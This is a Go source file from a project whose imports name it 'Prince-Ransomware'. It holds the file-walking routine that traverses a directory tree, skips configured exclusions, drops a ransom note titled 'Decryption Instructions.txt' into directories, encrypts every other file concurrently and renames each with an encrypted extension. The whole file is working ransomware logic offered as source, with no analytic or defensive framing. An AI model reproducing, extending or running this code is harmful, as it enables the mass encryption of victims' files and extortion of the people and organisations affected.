package filewalker

import (
	Configuration "Prince-Ransomware/configuration"
	Encryption "Prince-Ransomware/encryption"
	"os"
	"path/filepath"
	"strings"
	"sync"
)

func EncryptDirectory(dirPath string) {
	var wg sync.WaitGroup
	filepath.Walk(dirPath, func(path string, info os.FileInfo, err error) error {
		if info.IsDir() {
			for _, excluded := range Configuration.ExcludedDirectories {
				if strings.EqualFold(strings.ToLower(filepath.Base(path)), excluded) {
					return filepath.SkipDir
				}
				os.WriteFile(filepath.Join(path, "Decryption Instructions.txt"), []byte(Configuration.RansomNote), 0666)
			}
		}

		if !info.IsDir() {
			fileExt := filepath.Ext(path)
			for _, excluded := range Configuration.ExcludedExtensions {
				if strings.EqualFold(fileExt, excluded) {
					return nil
				}
			}

			fileName := strings.ToLower(filepath.Base(path))
			for _, excluded := range Configuration.ExcludedFiles {
				if strings.EqualFold(strings.ToLower(fileName), excluded) {
					return nil
				}
			}

			wg.Add(1)
			go func() {
				defer wg.Done()
				Encryption.EncryptFile(path)
				_ = os.Rename(path, path+Configuration.EncryptedExtension)
			}()
		}

		return nil
	})

	wg.Wait()
}
